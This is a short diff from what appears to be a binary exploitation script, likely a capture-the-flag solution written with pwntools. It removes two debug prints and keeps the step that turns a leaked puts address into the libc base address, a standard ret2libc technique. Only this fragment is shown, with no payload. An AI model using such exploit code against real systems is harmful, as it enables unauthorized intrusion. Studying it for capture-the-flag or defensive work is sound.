@@ -116,8 +116,6 @@ leaked_addr = u64(received.ljust(8, b"\x00"))
 print("--- leak BEGIN ---")
 print(hex(leaked_addr))
 print("--- leak END ---")
-print("libc.symbols puts")
-print(hex(libc.symbols["puts"]))
 libc.address = leaked_addr - libc.symbols["puts"] # calculate libc base: base = current_process_puts - offset_of_puts_from_base
 print("libc base @ %s" % hex(libc.address))
 
